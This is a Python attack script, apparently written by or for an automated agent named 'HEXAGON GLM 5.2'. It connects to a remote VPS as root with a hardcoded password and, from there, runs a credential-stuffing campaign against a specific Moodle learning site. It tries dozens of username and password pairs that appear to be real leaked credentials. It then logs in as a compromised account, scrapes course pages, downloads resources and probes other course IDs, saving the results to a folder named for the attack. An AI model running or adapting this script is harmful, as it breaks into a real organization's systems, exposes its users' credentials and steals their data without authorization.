#!/usr/bin/env python3
"""HEXAGON GLM 5.2 - Moodle course 1029 exploration + extra logins"""
import paramiko, json, time, re, sys, io
from datetime import datetime, timezone
sys.stdout = io.TextIOWrapper(sys.stdout.buffer, encoding="utf-8", errors="replace")
sys.stderr = io.TextIOWrapper(sys.stderr.buffer, encoding="utf-8", errors="replace")

VPS_HOST = "64.177.88.10"; VPS_USER = "root"; VPS_PASS = "5F.jyTK$D6%.F{a="
MOODLE = "https://universidad.findep.mx"

def ssh_exec(client, cmd, timeout=60):
    stdin, stdout, stderr = client.exec_command(cmd, timeout=timeout)
    return stdout.read().decode("utf-8", errors="replace"), stderr.read().decode("utf-8", errors="replace")

def safe_print(s, maxlen=2500):
    s = str(s)
    if len(s) > maxlen: s = s[:maxlen] + "...[truncated]"
    try: print(s)
    except: print(repr(s)[:maxlen])

def moodle_login(client, user, pwd, cookie_file):
    cmd = (f"curl -sk -m 15 -A 'Mozilla/5.0' -c {cookie_file} '{MOODLE}/login/index.php' -o /tmp/ml_{user}.html")
    ssh_exec(client, cmd, timeout=20)
    out, _ = ssh_exec(client, f"cat /tmp/ml_{user}.html", timeout=10)
    m = re.search(r'name="logintoken"\s+value="([^"]+)"', out)
    token = m.group(1) if m else ""
    cmd = (f"curl -sk -m 25 -A 'Mozilla/5.0' -b {cookie_file} -c {cookie_file} "
           f"--data-urlencode 'username={user}' --data-urlencode 'password={pwd}' "
           f"--data-urlencode 'logintoken={token}' "
           f"-o /tmp/ml_resp_{user}.html -w 'HTTP:%{{http_code}} SIZE:%{{size_download}} REDIR:%{{redirect_url}}' "
           f"'{MOODLE}/login/index.php'")
    out, _ = ssh_exec(client, cmd, timeout=30)
    return out.strip()

def main():
    print(f"[*] Connecting to VPS...")
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    client.connect(VPS_HOST, username=VPS_USER, password=VPS_PASS, timeout=30)
    print("[+] Connected")

    log = {}

    # 1. Try login with other emails found
    print("\n[*] === Try other emails ===")
    extra_creds = [
        ("pgonzalezz", "Capacita-1"),
        ("pgonzalezz", "Findep2021"),
        ("mlunavald", "Capacita-1"),
        ("mlunavald", "Findep2021"),
        ("pgonzalezz@findep.com.mx", "Capacita-1"),
        ("mlunavald@findep.com.mx", "Capacita-1"),
        # Common admin usernames
        ("administrator", "Capacita-1"),
        ("manager", "Capacita-1"),
        ("guest", "Capacita-1"),
        ("user", "Capacita-1"),
        ("test", "Capacita-1"),
        ("soporte", "Capacita-1"),
        ("soporte", "Findep2021"),
        ("capacita", "Capacita-1"),
        # Try with the BC creds
        ("admin", "4dm1n##*2411"),
        ("admin", "NosemepasaBC1#"),
        ("admin", "F1SA2024*#"),
        ("admin", "BcF1s42oo2d*C"),
        ("admin", "BcF1s42o2d*"),
        ("admin@findep.global", "4dm1n##*2411"),
        ("admin@findep.global", "NosemepasaBC1#"),
        ("jsanchezfern@findep.global", "Fisa2022*"),
        ("jeff@findep.global", "AFI2022*"),
        ("bemedezar@findep.global", "AFI2023*"),
    ]
    extra_results = []
    for user, pwd in extra_creds:
        cookie_file = f"/tmp/mc_{int(time.time()*1000)}.txt"
        r = moodle_login(client, user, pwd, cookie_file)
        # Success if redirect to /my/ or testsession
        success = "testsession=" in r or "/my/" in r or "loginredirect" not in r
        if "loginredirect=1" in r:
            success = False
        print(f"  {user}:{pwd} -> {r[:200]} | success={success}")
        extra_results.append({"user": user, "password": pwd, "response": r, "success": success})
        time.sleep(1)
    log["extra_login_attempts"] = extra_results

    # 2. Re-login as aguzmango and explore course 1029
    print("\n[*] === Re-login aguzmango + explore course 1029 ===")
    cookie_file = "/tmp/moodle_course_cookies.txt"
    moodle_login(client, "aguzmango", "Capacita-1", cookie_file)

    # Get course 1029
    cmd = (f"curl -sk -m 15 -A 'Mozilla/5.0' -b {cookie_file} -c {cookie_file} "
           f"-o /tmp/course1029.html -w 'HTTP:%{{http_code}} SIZE:%{{size_download}}' "
           f"'{MOODLE}/course/view.php?id=1029'")
    out, _ = ssh_exec(client, cmd, timeout=20)
    print(f"  Course 1029: {out.strip()}")
    out, _ = ssh_exec(client, "cat /tmp/course1029.html", timeout=10)
    course_html = out
    log["course_1029_html"] = out[:30000]

    # Extract all resource links
    print("\n[*] === Course 1029 resources ===")
    # Look for module links (mod/...)
    modules = re.findall(r'href="(/mod/[^"]+)"', course_html)
    print(f"  Modules: {len(modules)}")
    for m in modules[:30]:
        print(f"    {m}")
    log["course_1029_modules"] = list(set(modules))

    # Look for resource/pluginfile links
    resources = re.findall(r'href="(/pluginfile\.php/[^"]+)"', course_html)
    print(f"\n  Pluginfile resources: {len(resources)}")
    for r in resources[:20]:
        print(f"    {r}")
    log["course_1029_resources"] = list(set(resources))

    # Look for course sections
    sections = re.findall(r'id="section-(\d+)"[^>]*>(.*?)(?=id="section-|</li>)', course_html, re.DOTALL)
    print(f"\n  Sections: {len(sections)}")

    # 3. Download each resource
    print("\n[*] === Download course 1029 resources ===")
    downloaded = []
    for i, res_url in enumerate(list(set(resources))[:15]):
        full_url = f"{MOODLE}{res_url}" if res_url.startswith("/") else res_url
        fname = f"/tmp/res_1029_{i}.bin"
        cmd = (f"curl -sk -m 30 -A 'Mozilla/5.0' -b {cookie_file} -c {cookie_file} "
               f"-o {fname} -w 'HTTP:%{{http_code}} SIZE:%{{size_download}} TYPE:%{{content_type}}' "
               f"-L '{full_url}'")
        out, _ = ssh_exec(client, cmd, timeout=35)
        print(f"  [{i}] {res_url[-80:]}: {out.strip()}")
        # Get first bytes to identify file type
        head, _ = ssh_exec(client, f"head -c 200 {fname} | strings | head -5", timeout=10)
        downloaded.append({"url": res_url, "response": out.strip(), "head": head[:300]})
    log["downloaded_resources"] = downloaded

    # 4. Try to access other courses we haven't seen
    print("\n[*] === Try other course IDs ===")
    other_courses = [1073, 1074, 1078, 1090, 1143, 603, 756, 1298]
    course_info = {}
    for cid in other_courses:
        cmd = (f"curl -sk -m 15 -A 'Mozilla/5.0' -b {cookie_file} -c {cookie_file} "
               f"-o /tmp/c{cid}.html -w 'HTTP:%{{http_code}} SIZE:%{{size_download}}' "
               f"'{MOODLE}/course/view.php?id={cid}'")
        out, _ = ssh_exec(client, cmd, timeout=20)
        body, _ = ssh_exec(client, f"head -c 500 /tmp/c{cid}.html", timeout=10)
        title_m = re.search(r'<title>([^<]+)</title>', body)
        title = title_m.group(1) if title_m else ""
        course_info[cid] = {"response": out.strip(), "title": title}
        print(f"  Course {cid}: {title[:80]} | {out.strip()}")
        time.sleep(0.5)
    log["other_courses"] = course_info

    log["timestamp"] = datetime.now(timezone.utc).isoformat()
    out_file = r"c:\xampp\htdocs\pentagi\independencia_attack\hexagon_glm_moodle_courses.json"
    with open(out_file, "w", encoding="utf-8") as f:
        json.dump(log, f, indent=2, ensure_ascii=False)
    print(f"\n[+] Saved to {out_file}")

    client.close()

if __name__ == "__main__":
    main()
